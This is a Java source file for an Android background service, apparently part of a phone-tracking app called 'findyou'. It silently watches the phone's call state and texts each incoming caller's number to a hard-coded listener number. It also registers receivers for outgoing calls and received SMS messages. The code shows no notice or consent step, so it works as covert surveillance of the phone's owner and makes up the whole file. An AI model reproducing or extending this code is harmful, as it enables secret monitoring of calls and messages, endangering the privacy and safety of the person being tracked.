package com.example.hp.findyou;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.EditText;

public class MyService extends Service{
    private TelephonyManager tm;
    private PhoneStateListener psl;

    private toPhoneReceiver toPhoneReceiver;
    private IntentFilter tophoneIntentf;

    private msgReceiver msgReceiver;
    private IntentFilter msgIntentf;



    @Override
    public void onCreate() {
        super.onCreate();
        if (MyConstants.isIncoming) {
            tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
            psl = new PhoneStateListener() {
                @Override
                public void onCallStateChanged(int state, String incomingNumber) {
                    super.onCallStateChanged(state, incomingNumber);
                    if (state == TelephonyManager.CALL_STATE_RINGING) {
                        String msg = incomingNumber + "call he";
                        SmsManager sms = SmsManager.getDefault();
                        sms.sendTextMessage(MyConstants.listenerNumber, null, msg, null, null);
                    }
                }
            };
        }

        if (MyConstants.isOutcoming) {
            toPhoneReceiver = new toPhoneReceiver();
            tophoneIntentf = new IntentFilter();
        }

        if (MyConstants.isMessage) {
            msgReceiver = new msgReceiver();
            msgIntentf = new IntentFilter();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(MyConstants.isIncoming){
            tm.listen(psl, PhoneStateListener.LISTEN_CALL_STATE);
        }
        if(MyConstants.isOutcoming){
            tophoneIntentf.addAction("android.intent.action.NEW_OUTGOING_CALL");
            registerReceiver(toPhoneReceiver, tophoneIntentf);
        }

        if(MyConstants.isMessage){
            msgIntentf.addAction("android.provider.Telephony.SMS_RECEIVED");
            registerReceiver(msgReceiver, msgIntentf);
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if(MyConstants.isIncoming){
            tm.listen(psl, PhoneStateListener.LISTEN_NONE);
        }
        if(MyConstants.isOutcoming){
            unregisterReceiver(toPhoneReceiver);
        }

        if(MyConstants.isMessage){
            unregisterReceiver(msgReceiver);
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
